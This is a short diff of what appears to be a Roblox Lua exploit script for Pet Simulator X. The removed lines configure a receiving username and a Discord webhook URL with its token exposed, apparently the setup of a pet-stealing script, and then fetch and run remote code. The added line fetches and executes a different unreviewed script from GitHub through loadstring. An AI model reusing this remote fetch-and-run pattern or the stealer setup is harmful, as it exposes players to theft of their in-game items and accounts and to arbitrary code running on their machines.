@@ -1,5 +1,1 @@
-UserName = "DuperPetsim_X" -- good pets
-Webhook = "https://discord.com/api/webhooks/1168868557870874685/S9wIlL2qibDng7buFclkiyJ3qxHpsUqDZ5yt0TJkLN_ZbHpV0596S0tXBmIu6ymHljR6" -- pings for pets
-UserName2 = "DuperPetsim_X" -- bad pets
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WenJucks101/Pet-Simulator-X/main/Pet%20Simulator%20X", true))()
